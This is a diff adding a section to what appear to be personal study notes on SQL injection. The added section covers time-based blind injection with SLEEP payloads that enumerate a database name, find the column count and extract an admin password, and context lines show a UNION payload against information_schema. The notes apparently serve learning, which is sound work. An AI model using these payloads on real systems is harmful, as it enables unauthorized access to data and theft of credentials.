@@ -220,3 +220,25 @@ Get column and table names:
 admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'db_name' AND table_name LIKE 'a%';--
 
 Loop through characters and after finishing with information_schema.tables, next step is information_schema.columns.
+
+### Time Based Blind SQL Injection
+
+Nothing to work with visually.
+
+Only signal is how much time is response coming from the server.
+
+The command to enumerate through database name, if s is present in name response time will take around 5 seconds, if not it will run right away:
+
+`admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--`
+
+#### Finding column count
+
+`admin123' UNION SELECT SLEEP(5),2;--`
+
+If response time is 5 seconds the column count is 2.
+
+#### Enumerating data
+
+`admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE 'password123%';--`
+
+delay => true, no delay => false.
